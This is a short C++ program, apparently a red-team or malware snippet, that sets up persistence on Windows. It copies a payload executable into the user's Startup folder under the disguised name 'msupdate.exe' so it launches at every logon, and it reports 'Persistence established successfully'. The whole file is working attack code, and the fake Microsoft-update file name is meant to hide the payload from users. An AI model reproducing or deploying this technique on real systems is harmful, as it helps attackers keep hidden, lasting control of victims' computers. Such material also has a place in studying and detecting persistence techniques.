// Author: Nemuel Wainaina

#include <iostream>
#include <windows.h>
#include <shlobj.h>

int main() {
    const wchar_t* src = L"Path\\To\\Payload.exe";
    wchar_t destPath[MAX_PATH];

    if (SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, destPath) != S_OK) {
        return 1;
    }

    wcscat(destPath, L"\\msupdate.exe");

    if (!CopyFileW(src, destPath, FALSE)) {
        std::cerr << "Persistence attempt failed" << std::endl;
        return 1;
    }

    std::cout << "Persistence established successfully" << std::endl;
    return 0;
}
